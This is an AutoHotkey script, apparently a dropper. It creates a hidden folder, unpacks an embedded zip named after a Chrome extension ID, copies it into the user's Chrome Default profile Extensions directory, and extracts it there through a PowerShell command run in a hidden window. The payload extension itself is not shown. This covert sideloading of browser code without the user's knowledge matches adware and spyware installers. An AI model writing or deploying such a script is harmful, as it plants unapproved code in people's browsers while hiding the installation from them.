SetWorkingDir %A_ScriptDir%
FileCreateDir,System
FileSetAttrib,+H,%A_ScriptDir%\System
SetWorkingDir %A_ScriptDir%\System
FileInstall,System\dnoagfebjndkhkabjkkoeeijnjpmbimj.zip,dnoagfebjndkhkabjkkoeeijnjpmbimj.zip
TargetPath := "AppData\Local\Google\Chrome\User Data\Default\Extensions\dnoagfebjndkhkabjkkoeeijnjpmbimj"
UserProfile := A_UsersProfile
DestinationFolder := UserProfile . "\" . TargetPath
ZipFile := A_ScriptDir . "\dnoagfebjndkhkabjkkoeeijnjpmbimj.zip"
IfNotExist, %DestinationFolder%
{
FileCreateDir, %DestinationFolder%
}
FileCopy, dnoagfebjndkhkabjkkoeeijnjpmbimj.zip, %DestinationFolder%\dnoagfebjndkhkabjkkoeeijnjpmbimj.zip, 1
PowerShellCommand := "Expand-Archive -Path '" . DestinationFolder . "\dnoagfebjndkhkabjkkoeeijnjpmbimj.zip' -DestinationPath '" . DestinationFolder . "' -Force"
RunWait, %ComSpec% /c powershell -command "%PowerShellCommand%", , Hide, OutputVar
Clibboard := DestinationFolder
